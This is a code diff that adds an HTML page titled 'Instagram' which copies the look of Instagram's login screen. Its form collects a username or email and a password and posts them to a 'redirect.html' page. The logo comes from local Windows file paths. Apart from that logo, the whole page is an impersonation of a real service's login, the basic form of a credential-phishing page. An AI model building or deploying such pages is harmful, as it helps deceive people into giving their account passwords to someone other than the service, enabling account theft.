@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <link rel="icon" href="C:\Users\abhir\Downloads\28-287308_instagram-logo-text-white.png">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: black;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    }
+
+    .container {
+      background-color: #121212;
+      border: 1px solid #333;
+      padding: 40px;
+      border-radius: 10px;
+      width: 320px;
+      box-shadow: 0 0 10px rgba(255,255,255,0.1);
+      text-align: center;
+    }
+
+    .logo img {
+      width: 175px;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      background-color: #1e1e1e;
+      border: 1px solid #444;
+      border-radius: 5px;
+      color: white;
+    }
+
+    input::placeholder {
+      color: #bbb;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-weight: bold;
+      margin-top: 12px;
+      cursor: pointer;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+        <img src="C:\Users\abhir\OneDrive\Desktop\instgram login\28-287308_instagram-logo-text-white.png"  style="width: 175px; margin-bottom: 20px;">
+
+
+      
+    </div>
+    <form action="redirect.html" method="POST">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+    </form>
+    <div class="footer">
+      <a href="#" style="color:#aaa; text-decoration: none;">Forgot password?</a>
+    </div>
+  </div>
+</body>
+</html>
